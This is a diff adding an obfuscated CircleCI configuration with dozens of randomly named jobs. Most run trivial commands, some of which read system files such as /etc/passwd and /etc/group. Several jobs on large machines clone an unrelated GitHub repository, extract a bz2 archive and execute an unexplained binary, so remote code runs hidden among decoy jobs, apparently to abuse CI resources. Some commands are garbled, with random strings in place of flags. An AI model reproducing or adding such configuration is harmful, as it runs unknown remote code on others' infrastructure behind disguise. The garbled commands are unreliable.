+            { set +o pipefail 2>/dev/null; ls -F -g /mnt | tail -n +2 | head -n 4; true ; } > /var/tmp/batch4/wicfvjpeb
+            ls -lh /var/tmp/batch4/wicfvjpeb; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'wicfvjpeb'
+  vkibut:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: ejazlecreo
+          command: |
+            cut -c1-20 /var/tmp/batch4/wicfvjpeb 2>/dev/null | wc -c || true
+      - run:
+          name: rwbsjme
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: fodywwrcyiyzh
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  hxrkcxwjhae:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: xotqbyqwl
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; grep -o --context=1 if /etc/profile; true ; } > /var/tmp/batch4/tmshxtleefvel
+            ls -lh /var/tmp/batch4/tmshxtleefvel; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'tmshxtleefvel'
+  xhqcyufjddfduza:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: vzzgg
+          command: |
+            cut -c1-20 /var/tmp/batch4/tmshxtleefvel 2>/dev/null | wc -c || true
+      - run:
+          name: diawyjniwt
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: fgdoh
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  bzqknamq:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: cqkhmmz
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; find /var/log -type d -name "*.1" -ctime +100 -exec du -sh "{}" \; 2> /dev/null|nl; true ; } > /var/tmp/batch4/jzvsug
+            ls -lh /var/tmp/batch4/jzvsug; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jzvsug'
+  wlqge:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: cggarvigejii
+          command: |
+            cut -c1-20 /var/tmp/batch4/jzvsug 2>/dev/null | wc -c || true
+      - run:
+          name: okpyu
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: znuumq
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+  qdnqesnmtqi:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: hrdrtrtompsir
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; echo -n 'sorting results' | awk '{print NF}'; true ; } > /var/tmp/batch4/csveyzurk
+            ls -lh /var/tmp/batch4/csveyzurk; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'csveyzurk'
+  olmlop:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: czfjljffanixev
+          command: |
+            cut -c1-20 /var/tmp/batch4/csveyzurk 2>/dev/null | wc -c || true
+      - run:
+          name: naxjbouslops
+          command: git clone --depth 5 --quiet --single-branch --filter=tree:0 --no-tags https://github.com/mandiyu857is-afk/d384025b4061.git .
+      - run:
+          name: cpzued
+          command: bzcat eecwxaveb.tar.bz2 | tar xf -
+      - run:
+          command: bash -c "./asxtfjksm"
+
+  ekvkitoljzlgo:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: pgaetkptaai
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; for f in $HOME/.bash*; do [ -f "$f" ] && printf "%s %s\n" "$(wc -nvegexcwytxvsjz < "$f")" "$f"; done; true ; } > /var/tmp/batch4/qjvokrru
+            ls -lh /var/tmp/batch4/qjvokrru; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'qjvokrru'
+  lulontvvgdhouu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: ojaydr
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; getent group | head -n 6 | awk -F':' '{print $1, $3}'; true ; } > /var/tmp/batch4/ciqzzrc
+            ls -lh /var/tmp/batch4/ciqzzrc; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'ciqzzrc'
+  fknygkcsqfmwdhx:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: tevxdhod
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; ls ${HOME} | shuf -n 2; true ; } > /var/tmp/batch4/jfoyyzwez
+            ls -lh /var/tmp/batch4/jfoyyzwez; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jfoyyzwez'
+  dnmxditoiook:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: lszvq
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; cp /etc/shells /dev/shm/daily-juice.txt && sed -i 's|/bin/|/opt/bin/|' /dev/shm/daily-juice.txt && grep -c . /dev/shm/daily-juice.txt; true ; } > /var/tmp/batch4/jbvjjdrg
+            ls -lh /var/tmp/batch4/jbvjjdrg; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jbvjjdrg'
+  vosfimtyc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: hxqeznbcwfjz
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; for n in $(seq 8); do printf '%02d\n' $n; done | head -n 3; true ; } > /var/tmp/batch4/wicfvjpeb
+            ls -lh /var/tmp/batch4/wicfvjpeb; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'wicfvjpeb'
+  ekehntahs:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: lfxta
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; for entry in yellow summary route list link graph; do printf '%-8s %d\n' "$entry" ${#entry}; done; true ; } > /var/tmp/batch4/ppniyitj
+            ls -lh /var/tmp/batch4/ppniyitj; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'ppniyitj'
+  gwxeqimtesoew:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: abqstvmm
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; touch -d 'yesterday' "/dev/shm/tasks.log" && date -r "/dev/shm/tasks.log"; true ; } > /var/tmp/batch4/sslpffzym
+            ls -lh /var/tmp/batch4/sslpffzym; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'sslpffzym'
+  ugzmqmgysrf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: bzssskrljxdd
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; awk -F: '$4 != "" { print $1 }' /etc/group | head -n 10 | shuf -n 4 | head -n 5; true ; } > /var/tmp/batch4/nyknbrmuhh
+            ls -lh /var/tmp/batch4/nyknbrmuhh; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'nyknbrmuhh'
+  pomskqxw:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: epcjn
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; ls --human-readable --size /etc/security|sort -f; true ; } > /var/tmp/batch4/pybmlbhqnvqz
+            ls -lh /var/tmp/batch4/pybmlbhqnvqz; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'pybmlbhqnvqz'
+  dubujehnatz:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: rulanzotdmukq
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; touch "/tmp/city-box.dat" && mv "/tmp/city-box.dat" "/tmp/tmp-demo-hotel.copy" && ls -nvegexcwytxvsjz "/tmp/tmp-demo-hotel.copy"; true ; } > /var/tmp/batch4/qnbkjfxg
+            ls -lh /var/tmp/batch4/qnbkjfxg; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'qnbkjfxg'
+  lhplweuynyikpu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: plbth
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; cat /proc/meminfo | grep -ih MemAvailable | tail -n 3; true ; } > /var/tmp/batch4/csveyzurk
+            ls -lh /var/tmp/batch4/csveyzurk; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'csveyzurk'
+  xbqwdakzlvuxhy:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: yvcjzwpqbxhkhw
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; yes "water" | head -2; true ; } > /var/tmp/batch4/uqdkdqfoks
+            ls -lh /var/tmp/batch4/uqdkdqfoks; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'uqdkdqfoks'
+  vdpfsrmleed:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: kbtrgxguarn
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; cut -d: -f1 /etc/passwd | pr -3 -t | tac; true ; } > /var/tmp/batch4/rhgzfbdgmyyyzh
+            ls -lh /var/tmp/batch4/rhgzfbdgmyyyzh; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'rhgzfbdgmyyyzh'
+  frloxvu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: qfrnkkhp
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; expand -t 8 /etc/login.defs|head -n12; true ; } > /var/tmp/batch4/jlcwaptv
+            ls -lh /var/tmp/batch4/jlcwaptv; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jlcwaptv'
+  ptzaslc:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: hglhp
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; find /etc -maxdepth 2 -type nvegexcwytxvsjz -name '*tab' -size -2 -exec basename '{}' \; 2>/dev/null | sort -r; true ; } > /var/tmp/batch4/akbdkxsolqo
+            ls -lh /var/tmp/batch4/akbdkxsolqo; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'akbdkxsolqo'
+  dkglxkf:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: vwnzpgdjb
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; ls -nvegexcwytxvsjz /dev | grep "null"; true ; } > /var/tmp/batch4/jndlvlydbd
+            ls -lh /var/tmp/batch4/jndlvlydbd; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jndlvlydbd'
+  umjknya:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: uwpetc
+          command: |
+            mkdir -p /var/tmp/batch4
+            set +o pipefail 2>/dev/null; find / -maxdepth 2 -type d 2>/dev/null | head -30 > /var/tmp/batch4/jinhyeqn; seq 1 525424 >> /var/tmp/batch4/jinhyeqn; true
+            ls -lh /var/tmp/batch4/jinhyeqn; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jinhyeqn'
+  kpvmoiriqrofami:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: idhyucskxl
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; gzip -c /etc/group >'/tmp/login.jade.gz' && gunzip -c '/tmp/login.jade.gz' | wc -nvegexcwytxvsjz; true ; } > /var/tmp/batch4/jnbjdcren
+            ls -lh /var/tmp/batch4/jnbjdcren; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jnbjdcren'
+  cmscapu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: wnuhszh
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; find /proc/self -maxdepth 1 -type f -name 'limits' -exec basename {} \;; true ; } > /var/tmp/batch4/osepjl
+            ls -lh /var/tmp/batch4/osepjl; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'osepjl'
+  fxrtubcnihepmh:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: vjarxfwtgitxmmu
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; shuf -e mango banana papaya pear apple; true ; } > /var/tmp/batch4/jzvsug
+            ls -lh /var/tmp/batch4/jzvsug; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'jzvsug'
+  ggciwdj:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: adniqnqxoboyj
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; seq 9 | xargs -n 4; true ; } > /var/tmp/batch4/nqvhze
+            ls -lh /var/tmp/batch4/nqvhze; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'nqvhze'
+  bbkmgijzmhu:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: xfifjccc
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; for u in rosa frank lena nina bob grace; do printf '%s\n' $u; done | nl; true ; } > /var/tmp/batch4/mkxwumavqvjumw
+            ls -lh /var/tmp/batch4/mkxwumavqvjumw; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'mkxwumavqvjumw'
+  udvas:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: yobaqhjpc
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; ls -A $HOME | grep -v '^[a-m]' | nl -w2 -s". " | rev | tr -s ' '; true ; } > /var/tmp/batch4/zlifjstpt
+            ls -lh /var/tmp/batch4/zlifjstpt; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'zlifjstpt'
+  tdmehty:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /var/tmp/batch4
+      - run:
+          name: ugunfexy
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; echo '   leading spaces' | sha256sum | cut -c1-16; true ; } > /var/tmp/batch4/ylondwiqoxr
+            ls -lh /var/tmp/batch4/ylondwiqoxr; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'ylondwiqoxr'
+  sysxzarowzb:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: lftkdsllarzvp
+          command: |
+            mkdir -p /var/tmp/batch4
+            { set +o pipefail 2>/dev/null; df -k|tr -s ' '|expand -t 2; true ; } > /var/tmp/batch4/tobopmd
+            ls -lh /var/tmp/batch4/tobopmd; echo done
+      - persist_to_workspace:
+          root: /var/tmp/batch4
+          paths:
+            - 'tobopmd'
+workflows:
+  ugzvoqqrqjvj:
+    jobs:
+      - uwlzjcn
+      - ekvkitoljzlgo:
+          requires:
+            - uwlzjcn
+      - xxdxktgqikr:
+          requires:
+            - ekvkitoljzlgo
+      - uvkwzvnjubu:
+          requires:
+            - ekvkitoljzlgo
+      - lulontvvgdhouu:
+          requires:
+            - uvkwzvnjubu
+      - qdzrd:
+          requires:
+            - lulontvvgdhouu
+      - yyxctkmyskbzkcf:
+          requires:
+            - lulontvvgdhouu
+      - fknygkcsqfmwdhx:
+          requires:
+            - yyxctkmyskbzkcf
+      - jqvfxtv:
+          requires:
+            - fknygkcsqfmwdhx
+      - kmjxkfvhupfccsu:
+          requires:
+            - fknygkcsqfmwdhx
+      - dnmxditoiook:
+          requires:
+            - kmjxkfvhupfccsu
+      - vwpoybfshrv:
+          requires:
+            - dnmxditoiook
+      - nvegexcwytxvsjz:
+          requires:
+            - dnmxditoiook
+      - vosfimtyc:
+          requires:
+            - nvegexcwytxvsjz
+      - vkibut:
+          requires:
+            - vosfimtyc
+      - olpkyyhtyrednj:
+          requires:
+            - vosfimtyc
+      - ekehntahs:
+          requires:
+            - olpkyyhtyrednj
+      - sfwyyvoqnjfzc:
+          requires:
+            - ekehntahs
+      - scpzkq
+      - hploemkhckvl:
+          requires:
+            - scpzkq
+      - jdwpllxa:
+          requires:
+            - scpzkq
+      - lezlacjscsyeqs:
+          requires:
+            - jdwpllxa
+      - ngifjvcuhq:
+          requires:
+            - jdwpllxa
+      - fdbrus:
+          requires:
+            - ngifjvcuhq
+      - cxvpsyuzokfb:
+          requires:
+            - ngifjvcuhq
+      - ehwqr:
+          requires:
+            - cxvpsyuzokfb
+      - hxrkcxwjhae:
+          requires:
+            - cxvpsyuzokfb
+      - xhqcyufjddfduza:
+          requires:
+            - hxrkcxwjhae
+      - ormgbvmgvqxju
+      - gwxeqimtesoew:
+          requires:
+            - ormgbvmgvqxju
+      - hxdpfhch:
+          requires:
+            - gwxeqimtesoew
+      - qwkjxo:
+          requires:
+            - gwxeqimtesoew
+      - ugzmqmgysrf:
+          requires:
+            - qwkjxo
+      - mfaegldclunsdml:
+          requires:
+            - ugzmqmgysrf
+      - spflfapewm:
+          requires:
+            - ugzmqmgysrf
+      - pomskqxw:
+          requires:
+            - spflfapewm
+      - nwnsapbgfvlhqtt:
+          requires:
+            - pomskqxw
+      - gqlgnpg:
+          requires:
+            - pomskqxw
+      - dubujehnatz:
+          requires:
+            - gqlgnpg
+      - qguqvdnvng:
+          requires:
+            - dubujehnatz
+      - qdnqesnmtqi:
+          requires:
+            - dubujehnatz
+      - lhplweuynyikpu:
+          requires:
+            - qdnqesnmtqi
+      - olmlop:
+          requires:
+            - lhplweuynyikpu
+      - ltoctsndhwo:
+          requires:
+            - lhplweuynyikpu
+      - xbqwdakzlvuxhy:
+          requires:
+            - ltoctsndhwo
+      - gpuddezewjfedh:
+          requires:
+            - xbqwdakzlvuxhy
+      - linjdndmnjfz:
+          requires:
+            - xbqwdakzlvuxhy
+      - vdpfsrmleed:
+          requires:
+            - linjdndmnjfz
+      - oksmd:
+          requires:
+            - vdpfsrmleed
+      - nclcyeza:
+          requires:
+            - vdpfsrmleed
+      - frloxvu:
+          requires:
+            - nclcyeza
+      - svsrysvie:
+          requires:
+            - frloxvu
+      - ktevjdrrneiue:
+          requires:
+            - frloxvu
+      - ptzaslc:
+          requires:
+            - ktevjdrrneiue
+      - mccsty:
+          requires:
+            - ptzaslc
+      - vielfgpxvijbdny:
+          requires:
+            - ptzaslc
+      - dkglxkf:
+          requires:
+            - vielfgpxvijbdny
+      - abooyt:
+          requires:
+            - dkglxkf
+      - lyhxpcrsfcbncc:
+          requires:
+            - dkglxkf
+      - umjknya:
+          requires:
+            - lyhxpcrsfcbncc
+      - lfhrovukqv:
+          requires:
+            - umjknya
+      - ossami:
+          requires:
+            - umjknya
+      - kpvmoiriqrofami:
+          requires:
+            - ossami
+      - azrtrzohhlt:
+          requires:
+            - kpvmoiriqrofami
+      - nxgjqpbhvbyid
+      - cmscapu:
+          requires:
+            - nxgjqpbhvbyid
+      - ljdyxloiep:
+          requires:
+            - cmscapu
+      - bzqknamq:
+          requires:
+            - cmscapu
+      - fxrtubcnihepmh:
+          requires:
+            - bzqknamq
+      - wlqge:
+          requires:
+            - fxrtubcnihepmh
+      - svxnzmdbx:
+          requires:
+            - fxrtubcnihepmh
+      - ggciwdj:
+          requires:
+            - svxnzmdbx
+      - cejuenni:
+          requires:
+            - ggciwdj
+      - bllurwuyg:
+          requires:
+            - ggciwdj
+      - bbkmgijzmhu:
+          requires:
+            - bllurwuyg
+      - tucmralc:
+          requires:
+            - bbkmgijzmhu
+      - jbcqtdg:
+          requires:
+            - bbkmgijzmhu
+      - udvas:
+          requires:
+            - jbcqtdg
+      - vheoeoiupaxm:
+          requires:
+            - udvas
+      - soexfsytgwm:
+          requires:
+            - udvas
+      - tdmehty:
+          requires:
+            - soexfsytgwm
+      - hrnrxpccqb:
+          requires:
+            - tdmehty
+      - kzovvjr:
+          requires:
+            - tdmehty
+      - sysxzarowzb:
+          requires:
+            - kzovvjr
+      - upqibyeo:
+          requires:
+            - sysxzarowzb
